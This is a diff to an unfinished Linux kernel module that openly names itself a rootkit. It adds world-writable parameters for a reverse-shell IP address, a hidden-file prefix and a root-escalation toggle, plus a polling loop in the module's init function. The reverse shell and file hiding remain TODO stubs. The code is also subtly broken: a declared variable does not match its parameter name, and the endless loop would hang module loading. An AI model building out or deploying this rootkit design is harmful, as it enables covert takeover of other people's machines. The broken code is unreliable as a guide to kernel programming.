@@ -18,14 +18,23 @@ MODULE_DESCRIPTION("Linux rootkit.");
 MODULE_VERSION("0.1");
 MODULE_LICENSE("GPL");
 
-// Parameters.
+/**
+ * Module parameters are made writable by anyone.
+ * Any interaction with the rootkit will be through a command like:
+ * $ echo "1" > /sys/module/garden/parameters/get_root. This will
+ * update the value of the get_root parameter. We can poll this value
+ * intermittently and do things when it changes.
+ **/
 
 static char* rev_shell_ip = NULL;
-module_param(rev_shell_ip, charp, NULL);
+module_param(rev_shell_ip, charp, 0777);
 MODULE_PARM_DESC(rev_shell_ip, "IP Address for reverse shell.");
 static char* hidden_file_prefix = NULL;
-module_param(hidden_file_prefix, charp, NULL);
+module_param(hidden_file_prefix, charp, 0777);
 MODULE_PARM_DESC(hidden_file_prefix, "Prefix for hidden files.");
+static bool escalate_privileges = false;
+module_param(escalate_root_priveleges, bool, 0777);
+MODULE_PARM_DESC(escalate_root_priveleges, "Toggle for escalating current user to root.");
 
 // TODO: Figure out if this is needed at all.
 // /**
@@ -65,12 +74,16 @@ static int khook_inode_permission(struct inode* inode, int mask) {
 static int __init rootkit_init(void) {
     printk(KERN_INFO "Initializing rootkit.\n");
     khook_init();
-    if (rev_shell_ip) {
-        // TODO: Set up reverse shell.
-    }
 
-    if (hidden_file_prefix) {
-        // TODO: Set up hidden files.
+    while (true) {
+        // TODO: Check on /sys/module/garden/parameters/<PARAM> to see if it's changed since last check. Set up polling.
+        if (rev_shell_ip) {
+            // TODO: Set up reverse shell.
+        }
+
+        if (hidden_file_prefix) {
+            // TODO: Set up hidden files.
+        }
     }
 
     return 0;
